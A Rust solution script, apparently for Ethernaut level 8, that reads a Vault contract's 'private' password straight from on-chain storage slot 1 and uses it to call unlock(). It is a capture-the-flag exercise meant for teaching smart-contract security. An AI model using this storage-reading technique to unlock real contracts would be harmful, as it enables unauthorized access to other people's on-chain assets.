#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Address, B256, Bytes, U256, address,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    #[sol(rpc)]
    contract Vault {
        function unlock(bytes32 _password) public;
    }
}

#[allow(unused_imports)]
use crate::{ethernaut, utils};

use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level08_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level08())?;

    Ok(())
}

async fn level08() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let vault_address = "0x37E6583cb0756cAD368518F45A6C4Ae55550B09e".parse()?;
    let vault = Vault::new(vault_address, provider.clone());

    println!("[CHECK]");
    let slot0 = provider
        .get_storage_at(vault_address, U256::from(0))
        .await?;
    println!("vault's slot0 = {}", slot0);
    let slot1 = provider
        .get_storage_at(vault_address, U256::from(1))
        .await?;
    println!("vault's slot1 = {:x}\n", slot1);

    let password: B256 = slot1.into();

    let unlock_tx = vault.unlock(password).send().await?;
    println!(
        "[Vault.unlock()]    Panding transaction... {}",
        unlock_tx.tx_hash()
    );

    let unlock_receipt = unlock_tx.get_receipt().await?;
    println!(
        "[Vault.unlock()]    transaction included in block {}\n",
        unlock_receipt
            .block_number
            .expect("Failed to get block number")
    );

    println!("[CHECK]");
    let slot0 = provider
        .get_storage_at(vault_address, U256::from(0))
        .await?;
    println!("vault's slot0 = {}", slot0);
    let slot1 = provider
        .get_storage_at(vault_address, U256::from(1))
        .await?;
    println!("vault's slot1 = {:x}\n", slot1);

    Ok(())
}

// Vault = 0x37E6583cb0756cAD368518F45A6C4Ae55550B09e
